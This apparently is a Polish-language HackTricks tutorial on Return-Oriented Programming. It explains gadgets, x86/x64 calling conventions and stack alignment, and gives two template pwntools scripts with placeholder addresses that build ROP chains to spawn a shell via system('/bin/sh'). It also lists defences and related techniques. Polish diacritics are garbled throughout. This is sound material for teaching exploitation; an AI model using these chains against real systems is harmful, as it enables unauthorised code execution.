# ROP - Return Oriented Programing

{% hint style="success" %}
Naucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostpnij sztuczki hakerskie, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na GitHubie.

</details>
{% endhint %}

## **Podstawowe informacje**

**Return-Oriented Programming (ROP)** to zaawansowana technika eksploatacji u偶ywana do obejcia rodk贸w bezpieczestwa takich jak **No-Execute (NX)** lub **Data Execution Prevention (DEP)**. Zamiast wstrzykiwa i wykonywa shellcode, atakujcy wykorzystuje fragmenty kodu ju偶 obecnego w binarnym pliku lub w zaadowanych bibliotekach, znanych jako **"gad偶ety"**. Ka偶dy gad偶et zazwyczaj koczy si instrukcj `ret` i wykonuje ma operacj, tak jak przenoszenie danych midzy rejestrami lub wykonywanie operacji arytmetycznych. czc te gad偶ety ze sob, atakujcy mo偶e skonstruowa adunek w celu wykonania dowolnych operacji, efektywnie omijajc zabezpieczenia NX/DEP.

### Jak dziaa ROP

1. **Przechwycenie przepywu sterowania**: Najpierw atakujcy musi przej kontrol nad przepywem programu, zazwyczaj wykorzystujc przepenienie bufora, aby nadpisa zapisany adres powrotu na stosie.
2. **acuchowanie gad偶et贸w**: Atakujcy nastpnie starannie wybiera i czy gad偶ety, aby wykona po偶dane akcje. Mo偶e to obejmowa ustawienie argument贸w dla wywoania funkcji, wywoanie funkcji (np. `system("/bin/sh")`) i obsug koniecznego sprztania lub dodatkowych operacji.
3. **Wykonanie adunku**: Gdy podatna funkcja zwraca warto, zamiast powr贸ci do prawidowej lokalizacji, zaczyna wykonywa acuch gad偶et贸w.

### Narzdzia

Zazwyczaj gad偶ety mo偶na znale藕 za pomoc [**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget), [**ropper**](https://github.com/sashs/Ropper) lub bezporednio z **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)).

## acuch ROP w przykadzie x86

### **Konwencje wywoywania x86 (32-bitowe)**

* **cdecl**: Wywoujcy czyci stos. Argumenty funkcji s przekazywane na stosie w odwrotnej kolejnoci (od prawej do lewej). **Argumenty s przekazywane na stosie od prawej do lewej.**
* **stdcall**: Podobnie jak cdecl, ale wywoywany jest odpowiedzialny za wyczyszczenie stosu.

### **Znajdowanie gad偶et贸w**

Najpierw za贸偶my, 偶e zidentyfikowalimy niezbdne gad偶ety w binarnym pliku lub jego zaadowanych bibliotekach. Interesuj nas gad偶ety:

* `pop eax; ret`: Ten gad偶et ciga warto ze szczytu stosu do rejestru `EAX`, a nastpnie zwraca, umo偶liwiajc nam kontrol nad `EAX`.
* `pop ebx; ret`: Podobnie jak powy偶szy, ale dla rejestru `EBX`, umo偶liwiajc kontrol nad `EBX`.
* `mov [ebx], eax; ret`: Przenosi warto z `EAX` do lokalizacji pamici wskazywanej przez `EBX`, a nastpnie zwraca. Jest to czsto nazywane gad偶etem **write-what-where**.
* Dodatkowo mamy dostpny adres funkcji `system()`.

### **acuch ROP**

Korzystajc z **pwntools**, przygotowujemy stos do wykonania acucha ROP w nastpujcy spos贸b, majc na celu wykonanie `system('/bin/sh')`, zauwa偶, jak acuch zaczyna si od:

1. Instrukcji `ret` w celu wyr贸wnania (opcjonalnie)
2. Adres funkcji `system` (przy zao偶eniu wyczonego ASLR i znanego libc, wicej informacji w [**Ret2lib**](ret2lib/))
3. Miejsce na adres powrotu z `system()`
4. Adres acucha `"/bin/sh"` (parametr dla funkcji systemowej)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## acuch ROP w przykadzie x64

### **Konwencje wywoywania x64 (64-bitowe)**

* Wykorzystuje konwencj wywoywania **System V AMD64 ABI** w systemach przypominajcych Unix, gdzie **pierwsze sze argument贸w cakowitoliczbowych lub wska藕nik贸w jest przekazywanych w rejestrach `RDI`, `RSI`, `RDX`, `RCX`, `R8` i `R9`**. Dodatkowe argumenty s przekazywane na stosie. Warto zwracana jest umieszczana w `RAX`.
* Konwencja wywoywania **Windows x64** wykorzystuje `RCX`, `RDX`, `R8` i `R9` dla pierwszych czterech argument贸w cakowitoliczbowych lub wska藕nik贸w, a dodatkowe argumenty s przekazywane na stosie. Warto zwracana jest umieszczana w `RAX`.
* **Rejestry**: 64-bitowe rejestry obejmuj `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` oraz `R8` do `R15`.

#### **Znajdowanie Gadget贸w**

W naszym przypadku skupimy si na gad偶etach, kt贸re pozwol nam ustawi rejestr **RDI** (aby przekaza cig **"/bin/sh"** jako argument do funkcji **system()**) i nastpnie wywoa funkcj **system()**. Za贸偶my, 偶e zidentyfikowalimy nastpujce gad偶ety:

* **pop rdi; ret**: Usuwa warto z wierzchoka stosu do rejestru **RDI** i nastpnie zwraca. Istotne dla ustawienia argumentu dla **system()**.
* **ret**: Proste zwr贸cenie, przydatne do wyr贸wnania stosu w niekt贸rych scenariuszach.

I znamy adres funkcji **system()**.

### **acuch ROP**

Poni偶ej znajduje si przykad wykorzystujcy **pwntools** do skonfigurowania i wykonania acucha ROP majcego na celu wykonanie **system('/bin/sh')** na architekturze **x64**:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
W tym przykadzie:

* Wykorzystujemy gad偶et **`pop rdi; ret`** do ustawienia **`RDI`** na adres **`"/bin/sh"`**.
* Bezporednio skaczemy do **`system()`** po ustawieniu **`RDI`**, z adresem **system()** w acuchu.
* **`ret_gadget`** jest u偶ywany do wyr贸wnania, jeli rodowisko docelowe tego wymaga, co jest bardziej powszechne w **x64** w celu zapewnienia odpowiedniego wyr贸wnania stosu przed wywoaniem funkcji.

### Wyr贸wnanie stosu

**ABI x86-64** zapewnia, 偶e **stos jest wyr贸wnany do 16 bajt贸w** podczas wykonywania instrukcji **call**. **LIBC**, w celu zoptymalizowania wydajnoci, **u偶ywa instrukcji SSE** (takich jak **movaps**), kt贸re wymagaj tego wyr贸wnania. Jeli stos nie jest odpowiednio wyr贸wnany (czyli **RSP** nie jest wielokrotnoci 16), wywoania funkcji takich jak **system** zawiod w acuchu **ROP**. Aby to naprawi, po prostu dodaj **gad偶et ret** przed wywoaniem **system** w swoim acuchu ROP.

## G贸wna r贸偶nica midzy x86 a x64

{% hint style="success" %}
Poniewa偶 **x64 u偶ywa rejestr贸w dla kilku pierwszych argument贸w**, czsto wymaga mniej gad偶et贸w ni偶 x86 do prostych wywoa funkcji, ale znalezienie i czenie odpowiednich gad偶et贸w mo偶e by bardziej skomplikowane ze wzgldu na zwikszon liczb rejestr贸w i wiksz przestrze adresow. Zwikszona liczba rejestr贸w i wiksza przestrze adresowa w architekturze **x64** stanowi zar贸wno szanse, jak i wyzwania dla rozwoju exploit贸w, zwaszcza w kontekcie Return-Oriented Programming (ROP).
{% endhint %}

## acuch ROP w przykadzie ARM64

### **Podstawy ARM64 i konwencje wywoywania**

Sprawd藕 nastpujc stron dla tych informacji:

{% content-ref url="../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}



## Zabezpieczenia przed ROP

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **&** [**PIE**](../common-binary-protections-and-bypasses/pie/): Te zabezpieczenia sprawiaj, 偶e korzystanie z ROP jest trudniejsze, poniewa偶 adresy gad偶et贸w zmieniaj si midzy wykonaniami.
* [**Canary na stosie**](../common-binary-protections-and-bypasses/stack-canaries/): W przypadku przepenienia bufora, konieczne jest ominicie canary na stosie, aby nadpisa wska藕niki powrotu i wykorzysta acuch ROP.
* **Brak gad偶et贸w**: Jeli nie ma wystarczajcej liczby gad偶et贸w, nie bdzie mo偶liwe wygenerowanie acucha ROP.

## Techniki oparte na ROP

Zauwa偶, 偶e ROP to tylko technika su偶ca do wykonania dowolnego kodu. Na podstawie ROP opracowano wiele technik Ret2XXX:

* **Ret2lib**: U偶yj ROP, aby wywoa dowolne funkcje z zaadowanej biblioteki z dowolnymi parametrami (zwykle co w rodzaju `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: U偶yj ROP do przygotowania wywoania syscall, np. `execve`, i spraw, aby wykonywa dowolne polecenia.

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: Pierwszy wykorzysta EBP zamiast EIP do kontrolowania przepywu, a drugi jest podobny do Ret2lib, ale w tym przypadku przepyw jest kontrolowany g贸wnie za pomoc adres贸w EBP (cho konieczne jest r贸wnie偶 kontrolowanie EIP).

{% content-ref url="../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

## Inne przykady i odnoniki

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html)
* 64 bity, Pie i nx wczone, brak canary, nadpisz RIP adresem `vsyscall` w celu powrotu do nastpnego adresu na stosie, kt贸ry bdzie czciowym nadpisaniem adresu, aby uzyska cz funkcji wyciekajcej flag
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* arm64, brak ASLR, gad偶et ROP do sprawienia, 偶e stos jest wykonywalny i skok do shellcode na stosie

{% hint style="success" %}
Dowiedz si i wicz Hacking w AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Dowiedz si i wicz Hacking w GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
